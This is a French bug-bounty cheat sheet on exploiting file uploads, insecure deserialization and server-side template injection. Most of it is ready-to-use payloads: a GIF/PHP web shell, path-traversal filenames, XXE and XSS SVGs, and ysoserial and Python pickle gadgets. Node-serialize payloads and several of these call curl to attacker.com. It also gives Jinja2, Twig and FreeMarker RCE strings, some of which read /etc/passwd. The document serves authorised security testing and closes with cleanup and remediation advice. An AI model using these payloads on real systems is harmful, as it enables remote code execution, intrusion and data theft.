# File Upload, Deserialization & SSTI

## Contexte

Ces trois catégories mènent fréquemment à une **exécution de code à distance (RCE)** — la vulnérabilité la plus haute sévérité en bug bounty. Moins fréquentes que l'IDOR mais très recherchées pour leur payout.

## File Upload — Techniques d'exploitation

### Bypass de validation d'extension/type MIME

```
1. Double extension : shell.php.jpg, shell.jpg.php
2. Null byte (legacy, rare mais teste toujours) : shell.php%00.jpg
3. Extensions alternatives exécutables selon le serveur :
   .phtml, .php3, .php4, .php5, .php7, .pht (Apache/PHP)
   .asp, .aspx, .ashx, .asmx (IIS)
   .jsp, .jspx (Tomcat/Java)
4. Case variation : shell.PHP, shell.PhP (si filtre sensible à la casse)
5. Manipulation du Content-Type déclaré (souvent seul critère de validation) :
   Content-Type: image/jpeg  ← alors que le contenu réel est du PHP
6. Polyglot files : fichier valide en tant qu'image (magic bytes GIF89a/PNG corrects)
   ET valide en tant que script — utile si l'app vérifie les magic bytes.
7. Trailing characters : shell.php/, shell.php.
8. Confusion de configuration serveur : .htaccess upload (si autorisé) pour
   reconfigurer le handler d'extension sur le dossier d'upload (Apache legacy)
```

**Payload polyglot GIF/PHP :**
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

### Path Traversal via nom de fichier

```
filename="../../../../var/www/html/shell.php"
filename="..%2f..%2f..%2fshell.php"
```
Si le serveur utilise le nom de fichier fourni sans sanitization pour déterminer le chemin de stockage.

### SVG Upload — vecteurs souvent oubliés

```xml
<!-- XXE via SVG (parsers XML utilisés pour traiter les SVG) -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

<!-- XSS stockée via SVG (si affiché inline plutôt que téléchargé) -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>
```

### Vulnérabilités des bibliothèques de traitement d'image

- **ImageMagick "ImageTragick" family** — vérifier la version, tester les vecteurs MSL/MVG connus si version vulnérable identifiée.
- **ExifTool RCE** (CVE-2021-22204 et suivants) — injection dans les métadonnées EXIF traitées côté serveur.
- **PDF generation libraries** (wkhtmltopdf, Puppeteer) — SSRF/LFI via HTML injecté dans un champ converti en PDF.

> 💡 **Pro tip :** Après upload réussi, teste systématiquement le chemin d'accès prévisible (`/uploads/<filename>`, `/media/<hash>`) — beaucoup d'apps stockent sans vérifier l'accès en lecture au fichier uploadé après coup, même si l'exécution est bloquée.

## Insecure Deserialization

### Détection

Signatures à repérer selon le langage :

| Langage/Format | Signature de sérialisation |
|---|---|
| Java | `rO0AB` (base64 de `AC ED 00 05` en hex) dans cookies/params |
| PHP | `O:8:"stdClass"`, `a:2:{...}` |
| Python (pickle) | `\x80\x04\x95` ou base64 commençant par `gAS` |
| .NET | `AAEAAAD//` (BinaryFormatter), ViewState (`__VIEWSTATE`) |
| Ruby (Marshal) | `\x04\x08` |
| Node.js | `node-serialize` : `_$$ND_FUNC$$_` |

### Exploitation Java (gadget chains)

```bash
# Générer un payload avec ysoserial contre une gadget chain connue
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/rce-confirmed' > payload.bin
# Injecter le payload dans le champ/cookie/paramètre sérialisé identifié
```

### Exploitation .NET ViewState

```bash
# Si le MachineKey est connu/faible/leaké (souvent via un autre bug, ex: fichier web.config exposé)
ysoserial.net -p ViewState -g TypeConfuseDelegate -c "curl http://attacker.com" \
  --validationalg="SHA1" --validationkey="<key>" --generatoralg="..." --generatorkey="..."
```

### Exploitation Python pickle

```python
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/rce-confirmed',))
payload = pickle.dumps(Exploit())
```
Injecte ce payload partout où l'app désérialise des données utilisateur avec `pickle.loads()` (souvent dans des tokens de session custom, des queues de tâches Celery/RQ mal sécurisées).

### Node.js `node-serialize`

```javascript
'{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'curl http://attacker.com\', function(error, stdout, stderr) { console.log(stdout) });}()"}'
```

## Server-Side Template Injection (SSTI)

### Détection

```
Payload universel de détection : ${7*7}  ou  {{7*7}}  ou  #{7*7}  ou  <%= 7*7 %>
Si la réponse contient "49" → SSTI probable, identifier le moteur de template exact.
```

**Fingerprint du moteur :**

| Payload | Résultat si vulnérable | Moteur |
|---|---|---|
| `{{7*7}}` | 49 | Jinja2, Twig |
| `${7*7}` | 49 | Freemarker, Velocity (partiellement) |
| `#{7*7}` | 49 | Ruby ERB / Java EL |
| `{{7*'7'}}` | 7777777 | Jinja2 (spécifique Python) |
| `${{7*7}}` | 49 | Certains moteurs Spring |

**Exploitation Jinja2 (Python/Flask) → RCE :**

```python
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}  # recherche de classe exploitable (ex: subprocess.Popen)
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Exploitation Twig (PHP) → RCE :**

```twig
{{ ['id'] | filter('system') }}
{{ ['cat /etc/passwd'] | map('system') | join }}
```

**Exploitation FreeMarker (Java) → RCE :**

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
```

## Comment confirmer l'impact

- RCE : exécution d'une commande inoffensive (`id`, `whoami`, `curl vers serveur contrôlé`) — jamais de commande destructrice.
- Capture de la sortie de commande dans le rapport comme preuve, avec timestamp du serveur cible pour prouver l'exécution réelle (pas un mock).
- Toujours nettoyer après soi : supprimer tout fichier/shell uploadé après validation, ne rien laisser en place.

> ⚠️ **Attention légale :** Un shell web fonctionnel est une porte dérobée active sur un système de production. Confirme l'impact avec le strict minimum, documente immédiatement, et **supprime le fichier uploadé après preuve** — ne le laisse jamais accessible après la démonstration.

## Remédiation

- Validation stricte de type par magic bytes + re-encodage de l'image (pas juste vérification d'extension/MIME déclaré).
- Stockage des uploads hors racine web exécutable, avec des permissions non-exécutables.
- Désérialisation : jamais désérialiser des données non fiables ; utiliser des formats sûrs (JSON) plutôt que des formats natifs sérialisables (pickle, Java native serialization).
- Templates : sandboxing strict (Jinja2 `SandboxedEnvironment`), jamais de rendu de contenu utilisateur comme template brut.

## Références

- PortSwigger Web Security Academy — File upload vulnerabilities, SSTI
- `ysoserial` / `ysoserial.net` documentation
- HackTricks — SSTI, Insecure Deserialization
- PayloadsAllTheThings — File Upload, SSTI, Deserialization
